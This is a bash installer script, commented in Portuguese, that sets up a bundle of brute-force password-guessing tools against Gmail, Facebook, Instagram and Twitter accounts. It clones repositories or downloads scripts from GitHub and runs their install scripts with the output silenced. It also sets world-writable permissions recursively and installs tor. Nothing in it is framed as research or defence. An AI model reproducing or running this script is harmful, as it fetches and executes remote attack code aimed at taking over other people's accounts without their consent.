#!/bin/bash
# Atualiza repositório se estiver em um repositório Git (opcional)
git pull >> /dev/null

# Define permissões (cuidado com chmod 777)
chmod 777 -R *
chmod 777 -R .

# Atualização do sistema
apt-get update -qq >> /dev/null
# apt full-upgrade  (comentado)

# Instalação de dependências
apt install python2 python tor perl figlet runit openssl -y >> /dev/null

clear
sleep 2
figlet Installing ...

# Gmail Brute Force
figlet gmail bf
git clone https://github.com/Ha3MrX/Gemail-Hack.git >> /dev/null
sleep 2
clear
figlet Installing ...
figlet facebook bf

# Facebook Brute Force
if [ -d facebook ]; then
    echo "Directory facebook exists.[✔]"
else
    mkdir facebook
    cd facebook
    wget https://raw.githubusercontent.com/Sup3r-Us3r/scripts/master/fb-brute.pl
    cd ..
fi
sleep 2
clear
figlet Installing ...
figlet instagram bf1

# Instagram Brute Force 1
if [ -d instainsane ]; then
    cd instainsane
    chmod +x instainsane.sh
    chmod +x install.sh
    ./install.sh
    cd ..
else
    echo "Directory instainsane not found!"
fi
sleep 2
clear
figlet Installing ...
figlet twitter bf

# Twitter Brute Force
if [ -d tweetshell ]; then
    cd tweetshell
    chmod +x tweetshell.sh
    chmod +x install.sh
    ./install.sh
    cd ..
else
    echo "Directory tweetshell not found!"
fi
clear
figlet Installing ...
figlet instagram bf 2

# Instagram Brute Force 2
git clone https://github.com/samsesh/insta-bf.git
if [ -d insta-bf ]; then
    cd insta-bf 
    # Verifique o nome correto do arquivo abaixo (pode ser android_setup.sh)
    bash ./andriod_setup.sh >> /dev/null
    cd ..
else
    echo "Failed to clone insta-bf repository."
fi
clear
figlet done
# Volta para o diretório anterior se necessário
cd ..

# Facebook Brute Force 2
git clone https://github.com/fikrado/fikrado.py
if [ -d fikrado.py ]; then
    cd fikrado.py
    bash termux.sh >> /dev/null
else
    echo "Failed to clone fikrado.py repository."
fi
